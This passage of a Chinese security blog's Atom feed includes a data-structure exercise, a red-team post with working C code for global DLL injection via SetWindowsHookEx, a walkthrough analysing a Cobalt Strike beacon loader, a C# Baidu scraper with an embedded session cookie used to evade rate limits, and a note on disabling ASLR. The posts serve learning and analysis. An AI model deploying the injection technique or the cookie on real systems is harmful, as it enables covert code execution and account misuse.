for p in range(0,len(self.items)):                temp.__setitem__(p,self.items[p])            self.items=temp            del temp            return True        else:            return False    def __len__(self):        #返回数组长度        return len(self.items)    def __str__(self):        #返回str类型的数组        return str(self.items)    def __iter__(self):        #返回遍历好的数组        return iter(self.items)    def __getitem__(self, index):        #通过索引获取数组中的值        return self.items[index]    def __setitem__(self, index, newItem):        #替换指定位置的值        self.editarray(index)        self.items[index]=newItem        return self.items    def __delitem__(self, key):        #删除数组指定下标        del self.items[key]        return self.items    def __add__(self, value):        #数据末尾添加        calc=0        for k in self.items:            if len(str(k))!=0:                calc+=1            else:                break        self.__setitem__(calc,value)if __name__ == &#39;__main__&#39;:    a=Array(6)    for i in range(7):        a[i]=i    a.__delitem__(-1)    for x in a.__iter__():        print(x,end=&#39;&#39;)    a.__setitem__(0,9)    print(a.__str__())    a.__add__(101)    print(a.__str__())</code></pre><p>最终结果<br><img src="https://s3.ax1x.com/2020/12/29/rbUH0K.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构&lt;br&gt;目前需要学习的数据结构有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 抽象数据类型 ADT，面向对象编程
* 数组和列表
* 链表，高级链表。双链表，循环双端链表
* 队列，双</summary>
      
    
    
    
    
    <category term="数据结构" scheme="http://422926799.github.io/tags/数据结构/"/>
    
  </entry>
  
  <entry>
    <title>全局注入研究</title>
    <link href="http://422926799.github.io/posts/8bc59822.html"/>
    <id>http://422926799.github.io/posts/8bc59822.html</id>
    <published>2020-12-27T06:33:16.000Z</published>
    <updated>2020-12-27T06:50:35.088Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天和朋友聊的时候聊到全局注入，今天打算复现一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接:<a href="https://www.cnblogs.com/DarkBright/p/10835761.html" target="_blank" rel="noopener">https://www.cnblogs.com/DarkBright/p/10835761.html</a></p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>GetMsgProc<br>GetMsgProc与SetWindowsHookEx函数一起使用的应用程序定义或库定义的回调函数。每当GetMessage或PeekMessage函数从应用程序消息队列中检索消息时，系统就会调用此函数。在将检索到的消息返回给调用者之前，系统会将消息传递给挂钩过程。<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)</a></p><p>SetWindowsHookExA<br>将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></p><p>UnhookWindowsHookEx<br>删除通过SetWindowsHookEx函数安装在挂钩链中的挂钩过程。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex</a></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>整体思路：</p><pre><code>1. 声明钩子返回的函数即为GetMsgProc2. 设置钩子要钩住的的事件类型3. 定义要执行的函数4. DLLMain载入DLL的时候定义要执行的code5. 调用dll的LoadHook函数钩住6. 然后dll的HookLoad函数7. 由于载入DLL的时候会先执行DLLMain，所以当前进程会执行DLLMain然后在调用钩子钩住对应的类型，然后在注入dll8. 根据需求卸载钩子</code></pre><p>test.dll<br>导出的函数</p><pre><code>* LoadHook* UnloadHook</code></pre><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;HHOOK g_hook;HMODULE g_module;extern &quot;C&quot; {        __declspec(dllexport) BOOL LoadHook();}extern &quot;C&quot; {        __declspec(dllexport) VOID UnloadHook();}LRESULT CALLBACK GetMsgProc(        _In_ int    code,        _In_ WPARAM wParam,        _In_ LPARAM lParam) {        return CallNextHookEx(g_hook, code, wParam, lParam);}BOOL LoadHook(void) {        g_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_module, 0);        if (g_hook) {               MessageBoxA(NULL, &quot;Sucess&quot;, 0, MB_OK);               return TRUE;        }        else {               return FALSE;        }}VOID UnloadHook(void) {        if (g_hook) {               UnhookWindowsHookEx(g_hook);        }}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               g_module = hModule;               MessageBox(NULL, TEXT(&quot;加载DLL!&quot;), TEXT(&quot;提示&quot;), MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>inject.exe</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define DLL_NAME &quot;test.dll&quot;#define error(name){printf(&quot;Error:%s code:%d&quot;,name,GetLastError());}int main() {        do {               HMODULE hModule = LoadLibraryA(DLL_NAME);               if (hModule == NULL) {                       error(&quot;LoadLibraryA&quot;);                       break;               }               FARPROC pfnLoadHook = GetProcAddress(hModule,&quot;LoadHook&quot;);               FARPROC pfnUnLoadHook = GetProcAddress(hModule, &quot;UnloadHook&quot;);               if (pfnLoadHook == NULL || pfnUnLoadHook == NULL) {                       error(&quot;GetProcAddress&quot;);                       break;               }               if (pfnLoadHook()) {                       printf(&quot;global inject sucess!&quot;);               }else {                       printf(&quot;global inject failure&quot;);                       break;               }               printf(&quot;Enter UnloadHook&quot;);               getchar();               pfnUnLoadHook();        } while (FALSE);        getchar();        return 0;}</code></pre><p>在当前权限所允许的情况下，会多所有能访问的进程钩住注入dll<br><img src="https://s3.ax1x.com/2020/12/27/r56jvn.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/27/r5c32d.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天和朋友聊的时候聊到全局注入，今天打算复现一下&lt;/p&gt;
&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>cs 4.0马子分析模仿</title>
    <link href="http://422926799.github.io/posts/b4f959ad.html"/>
    <id>http://422926799.github.io/posts/b4f959ad.html</id>
    <published>2020-12-26T11:03:27.000Z</published>
    <updated>2020-12-26T11:55:29.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下<br>由于技术不行，复现的并不完整。纯属记录</p><p>原文链接：<a href="https://www.52pojie.cn/thread-1334525-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1334525-1-1.html</a></p><h2 id="测试描述"><a href="#测试描述" class="headerlink" title="测试描述"></a>测试描述</h2><p>cs version:4.1<br>分段式exe</p><h2 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h2><p>IDA 7.5<br>x64dbg</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>Exeinfo查看对应的信息<br><img src="https://s3.ax1x.com/2020/12/26/r4EwPx.png" alt=""></p><p>无ASLR拖动到IDA分析,可寻找到入口点<br>(主要流程是执行两个函数然后开始循环sleep，默认是等待1秒)<br><img src="https://s3.ax1x.com/2020/12/26/r4VVW6.png" alt=""></p><p>根据原文章主要点在sub_401795，而sub_402A60尝试着去分析。后面并无得出啥结论<br>sub_401795<br><img src="https://s3.ax1x.com/2020/12/26/r4V5kR.png" alt=""></p><p>主要过程</p><ul><li>获取时间戳除以0x26AA</li><li>拼接得到pipe（管道）</li><li>创建进程执行sub_401685函数</li><li>返回sub_401742函数执行结果</li></ul><p>sub_401685函数<br><img src="https://s3.ax1x.com/2020/12/26/r4VztI.png" alt=""></p><p>继续跟踪里面的sub_4015D0</p><ul><li>创建管道</li><li>链接对应的管道</li><li>向管道写入shellcode</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4ZyEd.png" alt=""></li></ul><p>sub_401742函数</p><ul><li>malloc分配对应的内存空间</li><li>延时0x400秒</li><li>执行sub_4016A2函数</li><li>循环结束后执行sub_40152E函数<br><img src="https://s3.ax1x.com/2020/12/26/r4Z4KS.png" alt=""></li></ul><p>sub_4016A2函数</p><ul><li>创建管道</li><li>读取管道里的内容</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4epVJ.png" alt=""></li></ul><p>sub_40152E函数</p><ul><li>申请0x3000大小的内存空间</li><li>执行sub_4014F3函数判断是采用GetModuleHandleA还是GetProcAddress函数</li><li>执行VirtualProtect函数修改内存属性</li><li>CreateThread执行shellcode<br>sub_4014F3函数<br><img src="https://s3.ax1x.com/2020/12/26/r4eoQK.png" alt=""></li></ul><p><img src="https://s3.ax1x.com/2020/12/26/r4eKIA.png" alt=""></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>x64dbg打开，用IDA查看入口点函数的地址。x64dbg跳转到对应的地址<br><img src="https://s3.ax1x.com/2020/12/26/r4mVWq.png" alt=""></p><p>对照IDA单步跟踪下去找到写入管道<br><img src="https://s3.ax1x.com/2020/12/26/r4m3k9.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mmlV.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mMmF.png" alt=""></p><p>读取管道并申请内存最后执行shellcode</p><ul><li>加载wininet.dll</li><li>再调用函数InternetOpen函数创建一个HINTERNET根句柄<br><img src="https://s3.ax1x.com/2020/12/26/r4m8YR.png" alt=""></li></ul><p>创建请求句柄，并把数据发送到服务器<br>随后解除数据向cs server发送请求<br><img src="https://s3.ax1x.com/2020/12/26/r4mN6K.png" alt=""></p><p>申请0x400000大小的内存，然后跳转执行到所申请的内存<br><img src="https://s3.ax1x.com/2020/12/26/r4mWnS.png" alt=""></p><p>然后原文那里解密出一个DLL并反射注入，并没模仿成功= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下&lt;br&gt;由于技术不行，复现的并不完整。纯属记录&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>C#爬虫初探</title>
    <link href="http://422926799.github.io/posts/ec93c081.html"/>
    <id>http://422926799.github.io/posts/ec93c081.html</id>
    <published>2020-12-26T04:11:54.000Z</published>
    <updated>2020-12-26T04:56:10.893Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想学一下C#的winform。然后打算造个轮子搞搞</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>C#发起Http请求用的是<code>using System.Net</code>,利用WebRequest<br>Example</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Net;using System.IO;namespace ConsoleApplication47{    class Program    {        static void Main(string[] args)        {            string url = &quot;http://www.baidu.com/&quot;;            HttpWebRequest data = (HttpWebRequest)WebRequest.Create(url); //创建请求的URL            data.UserAgent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;; //设置UA头            data.Method = &quot;GET&quot;; //设置请求的方式            HttpWebResponse response = (HttpWebResponse)data.GetResponse(); //获取响应            Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;); //实例化一个编码            StreamReader sr = new StreamReader(response.GetResponseStream(), enc); //读取响应流并编码为UTF-8            var html = sr.ReadToEnd(); //从编码后的响应流完整读取            Console.WriteLine(html);            Console.ReadLine();        }    }}</code></pre><p>参考链接：<br><a href="https://blog.csdn.net/ksr12333/article/details/48845417" target="_blank" rel="noopener">https://blog.csdn.net/ksr12333/article/details/48845417</a><br><a href="https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/" target="_blank" rel="noopener">https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/</a></p><p>结果如下<br><img src="https://s3.ax1x.com/2020/12/26/rhudAJ.png" alt=""></p><p>这里拿baidu查询一个IP的归属地作为本次的目的<br><img src="https://s3.ax1x.com/2020/12/26/rhur1x.png" alt=""></p><p>这里查询的IP其实是baidu调用<code>ip138.com</code>的接口查询，如果你直接去爬ip138速度快的话一会就封IP了。<br>但是通过baidu去查则不会，虽然用多线程去请求baidu。快一点会出现baidu安全，其实带个cookie就能绕了</p><p>UI如下<br><img src="https://s3.ax1x.com/2020/12/26/rhuz3q.png" alt=""></p><p>这里值得注意的东西</p><ul><li>多线程处理UI的时候如何解决非原线程访问UI</li><li>UI的内容如何及时输出</li></ul><p>所以具体代码如下</p><pre><code class="C#">using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Drawing;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Windows.Forms;using System.IO;using System.Net;using System.Text.RegularExpressions;using System.Threading;namespace WindowsFormsApplication5{    public partial class Form1 : Form    {   //     static ReaderWriterLockSlim LogWriteLock = new ReaderWriterLockSlim();        public Form1()        {           // Control.CheckForIllegalCrossThreadCalls=false;            InitializeComponent();        }        public void query(object tmp) {            string ip = tmp.ToString();            this.Invoke((EventHandler)delegate { this.label4.Text = &quot;IP正在查询:&quot; + ip; });            string url = &quot;http://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=&quot; + ip;            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);            req.Headers.Add(&quot;cookie&quot;, &quot;PSTM=1598200102; BAIDUID=73A08DA2B8A1C47748FE6E0263B2D7FC:FG=1; BIDUPSID=D1A9BC856D198D087B62FE6369A51D38; BD_UPN=12314753; sug=3; ORIGIN=2; bdime=0; sugstore=1; H_PS_PSSID=1453_33331_33306_31660_32973_33285_33287_33350_33313_33312_33311_33310_33309_33318_33308_33307_33239_33266_33389_33384; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; __yjs_duid=1_2bbdf988e437a50cf1e9527aeb11331f1608818232011; delPer=0; BD_CK_SAM=1; PSINO=6; COOKIE_SESSION=22_1_9_8_31_4_0_0_8_4_1_0_27_0_7_0_1608820717_1608280511_1608820710%7C9%23347061_47_1608280509%7C9; ZD_ENTRY=baidu; BD_HOME=1; BAIDUID_BFESS=F0D55FAB35899A68F91651F30B80AA72:FG=1; H_PS_645EC=7084MH7oreen2FkWL7qh5SKWiBZPRoo%2BRDJ4tyV3Dtv8JX%2BpHwi%2FAw83RfE; BA_HECTOR=8h000g848ka4akak7v1fu9k6f0q&quot;);            req.Method = &quot;GET&quot;;            try            {                HttpWebResponse response = (HttpWebResponse)req.GetResponse();                Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;);                StreamReader sr = new StreamReader(response.GetResponseStream(), enc);                string html = sr.ReadToEnd();                sr.Close();                Regex zz = new Regex(@&quot;IP地址:.*&quot;);                var ips = zz.Matches(html);                if (ips.Count &gt; 0)                {                    string data = ips[0].ToString().Replace(&quot;&amp;nbsp;&quot;, &quot;&quot;).Replace(&quot;&lt;/span&gt;&quot;, &quot;-&quot;);                    this.Invoke((EventHandler)delegate                    {                        result.Text += data.ToString() + &quot;\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }                else                {                    this.Invoke((EventHandler)delegate                    {                        result.Text += &quot;IP:&quot; + ip + &quot;查询失败\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }            }            catch {                this.Invoke((EventHandler)delegate                {                    result.Text += &quot;IP:&quot;+ip+&quot;请求失败\n&quot;;                    result.Refresh();                    result.SelectionStart = result.Text.Length;                    result.ScrollToCaret();                });            }        }        private void button2_Click(object sender, EventArgs e)        {            List&lt;string&gt; iplist = new List&lt;string&gt;();            string []data = richTextBox1.Text.Split(&#39;\n&#39;);            foreach (var ip in data)            {                Regex pd = new Regex(&quot;(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)&quot;);                if (pd.Match(ip).ToString() != &quot;&quot;)                {                    iplist.Add(ip);                }            }            label3.Text = &quot;合法IP数量:&quot; + iplist.Count;            label3.Refresh();            foreach (var ip2 in iplist) {                label4.Refresh();                Thread t=new Thread(new ParameterizedThreadStart(query));                t.Start(ip2);            }            label4.Text = &quot;查询完成&quot;;            label4.Refresh();        }        private void button1_Click(object sender, EventArgs e)        {            try            {                File.WriteAllText(&quot;save.txt&quot;, result.Text);                MessageBox.Show(&quot;保存文件成功&quot;);            }            catch {                MessageBox.Show(&quot;保存文件失败&quot;);            }        }    }}</code></pre><p>最后测试结果<br><img src="https://s3.ax1x.com/2020/12/26/rhKdr8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近想学一下C#的winform。然后打算造个轮子搞搞&lt;/p&gt;
&lt;h2 id=&quot;过程&quot;&gt;&lt;a href=&quot;#过程&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="Warring" scheme="http://422926799.github.io/tags/Warring/"/>
    
  </entry>
  
  <entry>
    <title>开启和关闭ASLR</title>
    <link href="http://422926799.github.io/posts/2a9e327.html"/>
    <id>http://422926799.github.io/posts/2a9e327.html</id>
    <published>2020-12-19T13:07:08.000Z</published>
    <updated>2020-12-19T13:43:45.485Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在分析样本的时候提到了ASLR，特地去了解了一下。记录一下</p><h2 id="ASLR的由来"><a href="#ASLR的由来" class="headerlink" title="ASLR的由来"></a>ASLR的由来</h2><p>微软从windows vista/windows server 2008（kernel version 6.0）开始采用ASLR技术，主要目的是为了防止缓冲区溢出<br>ASLR技术会使PE文件每次加载到内存的起始地址随机变化，并且进程的栈和堆的起始地址也会随机改变。<br>该技术需要操作系统和编译工具的双重支持（主要是操作系统的支持，编译工具主要作用是生成支持ASLR的PE格式）<br>若不想使用ASLR功能，可以在VS编译的时候将“配置属性-&gt;链接器-&gt;高级-&gt;随机基址”的值修改为否即可</p><h2 id="开启了ASLR和没开之间的区别"><a href="#开启了ASLR和没开之间的区别" class="headerlink" title="开启了ASLR和没开之间的区别"></a>开启了ASLR和没开之间的区别</h2><p>开启了ASLR的PE段多出一个.reloc，没开启ASLR没有.reloc这个段<br><img src="https://s3.ax1x.com/2020/12/19/rUkS9H.png" alt=""></p><p>IMAGE_FILE_HEADER\Characteristics<br>开启了ASLR的比没开启ASLR的少了一个IMAGE_FILE_RELOCS_STRRIPED<br>该字段的含义</p><p>重新定位信息被从文件中剥离。文件必须在它的首选基地址加载。如果基地址不可用，加载程序将报告错误。<br><code>https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v = vs.85).aspx</code><br><img src="https://s3.ax1x.com/2020/12/19/rUktC4.png" alt=""></p><p>IMAGE_OPTIONAL_HEADER\DllCharacteristics<br>开启ASLR的程序比未开启的DllCharactersitics多了一个字段IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE，该字段值的含义<br><em>可以在加载时重新定位DLL</em><br><img src="https://s3.ax1x.com/2020/12/19/rUEWHP.png" alt=""></p><p>删除PE文件的ASLR功能<br>将IMAGE_OPTIONAL_HEADER\DllCharacteristic中的IMAGE_DLLCHARACTERISTICS_DYNAMIC字段值去掉即可：将PE中的十六进制第一个40 81数据改为00 81<br><img src="https://s3.ax1x.com/2020/12/19/rUViuR.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/19/rUVugH.png" alt=""></p><p>修改完在去看，发现IMAGE_DLLCHARACTERISTICS_DYNAMIC字段已经被删除<br><img src="https://s3.ax1x.com/2020/12/19/rUVlDI.png" alt=""></p><p>调试中的不同，无ASLR或关闭了ASLR是可以成功对应IDA的地址在OD中找到的<br><img src="https://s3.ax1x.com/2020/12/19/rUVJ58.png" alt=""></p><p>开启了ASLR后入口点和地址被随机化，无法定位<br><img src="https://s3.ax1x.com/2020/12/19/rUVtPS.png" alt=""></p><p>x64关闭ASLR<br>x64关闭PE的ASLR尝试寻找对应的十六进制发现找不到对应介绍的文章<br>后面发现可以用CFF Explore来关闭<br>64位<br><img src="https://s3.ax1x.com/2020/12/19/rUVcPU.png" alt=""></p><p>在编辑可选PE头的DllCharacteristics，点击Click here，将第一个复选框dll can move 去除勾选即可。改完以后Save<br><img src="https://s3.ax1x.com/2020/12/19/rUVqRe.png" alt=""></p><p>关闭ASLR后<br><img src="https://s3.ax1x.com/2020/12/19/rUVXMd.png" alt=""></p><p>关闭ASLR，从系统层面修改注册表；从PE文件中即修改相关字段值。<br>在调试程序的时候，因为地址随机化，每次调试地址都不一样，很是影响调试效果。关闭后文件总是加载到以400000为基址的地址范围内，代码的地址和IDA中也一直，所以大大方便分析。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/Kwansy/article/details/108292942" target="_blank" rel="noopener">修改PE可选头关闭ASLR</a><br><a href="https://www.jianshu.com/p/91b2b6665e64" target="_blank" rel="noopener">关闭地址随机化ASLR</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天在分析样本的时候提到了ASLR，特地去了解了一下。记录一下&lt;/p&gt;
&lt;h2 id=&quot;ASLR的由来&quot;&gt;&lt;a href=&quot;#ASLR的由来</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
</feed>
